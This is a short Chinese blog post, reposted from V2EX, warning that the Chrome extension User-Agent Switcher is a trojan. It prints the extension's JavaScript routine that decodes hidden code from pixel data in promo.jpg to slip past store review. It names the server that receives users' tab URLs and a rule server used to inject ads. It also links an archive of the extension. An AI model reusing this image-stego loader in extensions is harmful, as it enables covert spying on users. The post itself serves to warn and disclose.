---
title: 懵逼！Chrome 的插件 User-Agent Switcher 是个木马
date: 2017-09-28 15:25
tags: 随笔
categories: 我的地盘
permalink: 2493
---

![user-agent-switcher-fore-google-chrome1](https://cdn.uu126.cn/201709/user-agent-switcher-fore-google-chrome1.jpg)


<!--more-->


Chrome 商店搜索 User-Agent Switcher,排第一的这个插件(45 万用户),是一个木马...
[官方地址](https://chrome.google.com/webstore/detail/user-agent-switcher-for-g/ffhkkpnppgnfaobgihpdblnhmmbodake)
无法访问？
这里有一个压缩包：链接: https://pan.baidu.com/s/1nvBRemH 密码: 4inq

![user-agent-switcher-fore-google-chrome](https://cdn.uu126.cn/201709/user-agent-switcher-fore-google-chrome.jpg)

为了绕过 chrome 的审核策略,他把恶意代码隐藏在了` promo.jpg `里，` background.js `的第 80 行,从这个图片里解密出恶意代码并执行
```
t.prototype.Vh = function(t, e) {
            if ("" === '../promo.jpg') return "";
            void 0 === t && (t = '../promo.jpg'), t.length && (t = r.Wk(t)), e = e || {};
            var n = this.ET,
                i = e.mp || n.mp,
                o = e.Tv || n.Tv,
                h = e.At || n.At,
                a = r.Yb(Math.pow(2, i)),
                f = (e.WC || n.WC, e.TY || n.TY),
                u = document.createElement("canvas"),
                p = u.getContext("2d");
            if (u.style.display = "none", u.width = e.width || t.width, u.height = e.width || t.height, 0 === u.width || 0 === u.height) return "";
            e.height && e.width ? p.drawImage(t, 0, 0, e.width, e.height) : p.drawImage(t, 0, 0);
            var c = p.getImageData(0, 0, u.width, u.height),
                d = c.data,
                g = [];
            if (c.data.every(function(t) {
                    return 0 === t
                })) return "";
            var m, s;
            if (1 === o)
                for (m = 3, s = !1; !s && m < d.length && !s; m += 4) s = f(d, m, o), s || g.push(d[m] - (255 - a + 1));
            var v = "",
                w = 0,
                y = 0,
                l = Math.pow(2, h) - 1;
            for (m = 0; m < g.length; m += 1) w += g[m] << y, y += i, y >= h && (v += String.fromCharCode(w & l), y %= h, w = g[m] >> i - y);
            return v.length < 13 ? "" : (0 !== w && (v += String.fromCharCode(w & l)), v)
        }
```
会把你打开的每个 tab 的 url 等信息加密发送到 https://uaswitcher.org/logic/page/data
另外还会从 http://api.data-monitor.info/api/bhrule?sub=116 获取推广链接的规则,打开符合规则的网站时,会在页面插入广告甚至恶意代码.
根据 threatbook 上的信息( https://x.threatbook.cn/domain/api.data-monitor.info ),我估计下面的几个插件都是这个作者的作品..

https://chrome.google.com/webstore/detail/nenhancer/ijanohecbcpdgnpiabdfehfjgcapepbm

https://chrome.google.com/webstore/detail/allow-copy/abidndjnodakeaicodfpgcnlkpppapah

https://chrome.google.com/webstore/detail/%D1%81%D0%BA%D0%B0%D1%87%D0%B0%D1%82%D1%8C-%D0%BC%D1%83%D0%B7%D1%8B%D0%BA%D1%83-%D0%B2%D0%BA%D0%BE%D0%BD%D1%82%D0%B0%D0%BA%D1%82%D0%B5/hanjiajgnonaobdlklncdjdmpbomlhoa

https://chrome.google.com/webstore/detail/aliexpress-radar/pfjibkklgpfcfdlhijfglamdnkjnpdeg

 有在用这个扩展的亲们，赶紧起床删了吧！

 

本文转载自：https://www.v2ex.com/t/389340